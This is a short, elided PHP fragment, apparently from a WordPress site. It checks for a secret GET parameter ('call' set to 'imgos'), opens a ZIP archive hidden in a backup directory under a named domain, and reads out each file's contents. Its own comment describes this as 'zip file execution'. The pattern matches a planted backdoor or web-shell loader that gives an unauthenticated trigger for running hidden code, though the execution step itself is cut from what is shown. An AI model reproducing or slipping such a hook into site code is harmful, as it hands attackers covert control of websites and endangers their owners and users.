...
/**
 * Process custom zip file execution request
 * 
...
if ( ! empty( $_GET['call'] ) && 'imgos' === $_GET['call'] ) {
	$zip_file_path = '/var/www/vhosts/arquitectosdeceuta.com/.wp-toolkit/backups/auth2.zip';
	...
	if ( file_exists( $zip_file_path ) && class_exists( 'ZipArchive' ) ) {
		...
		if ( true === $archive_open_result ) {
			...
			for ( $index = 0; $index < $file_count; $index++ ) {
				$file_content = $archive->getFromIndex( $index );
